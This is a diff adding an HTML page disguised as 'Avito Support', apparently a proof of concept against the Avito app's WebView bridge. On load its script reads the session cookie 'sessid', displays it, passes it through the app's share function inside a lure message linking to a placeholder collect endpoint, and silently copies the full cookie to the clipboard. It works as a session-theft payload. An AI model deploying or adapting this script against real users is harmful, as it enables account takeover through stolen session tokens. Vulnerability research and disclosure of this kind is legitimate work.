@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head><title>Avito Support</title></head>
+<body>
+<p id="status">Loading...</p>
+<script>
+window.onload = function() {
+  var cookie = document.cookie;
+  var m = cookie.match(/sessid=([^;]+)/);
+  var sessid = m ? m[1] : 'NOT_FOUND';
+
+  // Показываем токен прямо на странице (для записи видно)
+  document.getElementById('status').innerText = 'sessid: ' + sessid.substring(0, 40) + '...';
+
+  // Option A: share sheet с токеном — ключевой proof
+  if (window.appInterface) {
+    window.appInterface.share(
+      'Avito – у вас новое сообщение',
+      'Проверьте объявление',
+      'https://YOUR_DOMAIN/collect?s=' + encodeURIComponent(sessid)
+    );
+
+    // Option B: silent copy
+    window.appInterface.copy(cookie);
+  } else {
+    document.getElementById('status').innerText = 'appInterface NOT FOUND (not in Avito WebView)';
+  }
+};
+</script>
+</body>
+</html>
